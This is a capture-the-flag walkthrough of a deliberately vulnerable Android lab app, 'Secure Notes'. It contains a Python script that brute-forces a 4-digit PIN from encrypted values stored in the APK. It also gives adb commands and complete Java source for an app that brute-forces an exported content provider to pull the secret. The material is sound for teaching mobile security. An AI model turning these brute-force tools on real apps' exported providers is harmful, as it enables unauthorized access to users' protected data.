**Description**: Welcome to the **Secure Notes Challenge**! This lab immerses you in the intricacies of Android content providers, challenging you to crack a PIN code protected by a content provider within an Android application. It's an excellent opportunity to explore Android's data management and security features.

**Download**: https://lautarovculic.com/my_files/secureNotes.apk
**Link**: https://www.mobilehackinglab.com/path-player?courseid=lab-secure-notes

![[secureNotes.png]]

Install the **APK** with **ADB**
```bash
adb install -r secureNotes.apk
```

We can see that we need insert a **4 digit numbers PIN**.
Let's decompile it with **apktool**
```bash
apktool d secureNotes.apk
```

Also, let's check the **source code** with **jadx**.
Notice that the **directory that apktool** drop us, inside of `assets` directory, we have the `config.properties` file.
Which have this content:
```txt
encryptedSecret=bTjBHijMAVQX+CoyFbDPJXRUSHcTyzGaie3OgVqvK5w=
salt=m2UvPXkvte7fygEeMr0WUg==
iv=L15Je6YfY5owgIckR9R3DQ==
iterationCount=10000
```

May be this can be cracked? :P
```python
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

# data
encrypted_secret = base64.b64decode("bTjBHijMAVQX+CoyFbDPJXRUSHcTyzGaie3OgVqvK5w=")
salt = base64.b64decode("m2UvPXkvte7fygEeMr0WUg==")
iv = base64.b64decode("L15Je6YfY5owgIckR9R3DQ==")
iteration_count = 10000

# decrypt
def decrypt_secret(password):
    try:
        # PBKDF2
        key = PBKDF2(password, salt, dkLen=32, count=iteration_count)

        # AES (CBC)
        cipher = AES.new(key, AES.MODE_CBC, iv)

        # decrypt
        decrypted = cipher.decrypt(encrypted_secret)

        # delete padding (PKCS7)
        pad = decrypted[-1]
        if all(p == pad for p in decrypted[-pad:]):
            return decrypted[:-pad].decode('utf-8')
    except (UnicodeDecodeError, ValueError):
        pass
    return None

# brute-force between 0000 and 9999
for i in range(0, 10000):
    password = f"{i:04d}"  # format numbers (eg. 0001, 1234)
    result = decrypt_secret(password)
    if result:
        print(f"[+] PIN: {password}")
        print(f"[+] Secret: {result}")
        break
    else:
        print(f"[-] Testing: {password}", end='\r')
```

Output:
```bash
[+] PIN: 2580
[+] Secret: CTF{D1d_********1t!1?}
```
This is so dirty.... let's hack as MHL want.

Let's move to **source code**.
The package name is `com.mobilehackinglab.securenotes`.
We have just **one activity** which is `com.mobilehackinglab.securenotes.MainActivity`.
Also, is exported.
Notice that we have an **Content Provider** (*Exported* & *Enabled*)
```XML
<provider  
    android:name="com.mobilehackinglab.securenotes.SecretDataProvider"  
    android:enabled="true"  
    android:exported="true"  
    android:authorities="com.mobilehackinglab.securenotes.secretprovider"/>  

<activity  
    android:name="com.mobilehackinglab.securenotes.MainActivity"  
    android:exported="true">  
    <intent-filter>  
        <action android:name="android.intent.action.MAIN"/>  
        <category android:name="android.intent.category.LAUNCHER"/>  
    </intent-filter>  
</activity>
```

We can see the **code** where this provider are implemented. Is an class named **`SecretDataProvider`**.
In the `onCreate()` method we can see the information that we was work with the **AES** decrypt method.

Useful code is
```java
if (selection == null || !StringsKt.startsWith$default(selection, "pin=", false, 2, (Object) null)) {
    return null;
}
String removePrefix = StringsKt.removePrefix(selection, (CharSequence) "pin=");
```

Problem:
- A `pin=` parameter is expected in the query, but no robust validation is performed on the value.
- An **attacker can send common pins or perform a brute force attack** directly.
- There is no mechanism for **rate limiting** (limit attempts per minute).

Also, we have a response
```java
MatrixCursor $this$query_u24lambda_u243_u24lambda_u242 = new MatrixCursor(new String[]{"Secret"});
$this$query_u24lambda_u243_u24lambda_u242.addRow(new String[]{secret});
```

Problem:
- *If the pin is correct*, the application **returns the secret in a response without any additional obfuscation** or validation.
- The attacker **receives the decrypted content directly**.

But, the **main problem** is that the **provider is exported** (as in `AndroidManifest.xml` can see).
This mean that **any app installed on device can make unlimited query**.

So, we have the uri:
`content://com.mobilehackinglab.securenotes.secretprovider`
How we can get this?
Simple, in **android manifest** or just **unzipping** the **apk** file, then, search for **strings** in the **`classes.dex`** files.
```bash
strings classes* | grep content://
```

We can run this **ADB** command
```bash
adb shell content query \
    --uri content://com.mobilehackinglab.securenotes.secretprovider \
    --where "pin=2580"
```
Notice that `--where` is because we have a *provider with selection* (mentioned in "useful code").

We can't **update**, **delete** or **insert** PINs because there aren't implementation if you look the code.
Also, check in the source code that the line
```java
String format = String.format("%04d", Arrays.copyOf(new Object[]{Integer.valueOf(Integer.parseInt(removePrefix))}, 1));
```
Clearly said that the PIN is between 0000 - 9999

This query can be **bruteforceable**.
But, let's make our **own** app.
The concept is simple, just make many query **until you match with the secret** `CTF{`
You can make a so **simple app**
```java
package com.lautaro.insecurenotes;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "secretPin";
    private static final String PROVIDER_URI = "content://com.mobilehackinglab.securenotes.secretprovider";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Init
        new Thread(this::bruteForcePin).start();
    }

    private void bruteForcePin() {
        Uri uri = Uri.parse(PROVIDER_URI);

        for (int i = 0; i < 10000; i++) {
            String pin = String.format("%04d", i);
            String selection = "pin=" + pin;

            try (Cursor cursor = getContentResolver().query(uri, null, selection, null, null)) {
                if (cursor != null && cursor.moveToFirst()) {
                    String result = cursor.getString(cursor.getColumnIndexOrThrow("Secret"));
                    Log.d(TAG, "Correct PIN!: " + pin + " | Secret: " + result);
                    break;
                }
            } catch (Exception e) {
                Log.e(TAG, "Error: " + pin, e);
            }
        }
    }
}
```

Or use some beautiful like the mine ;)

![[secureNotes2.png]]
**Download**: https://lautarovculic.com/my_files/insecureNotes-MHL.apk

I hope you found it useful (: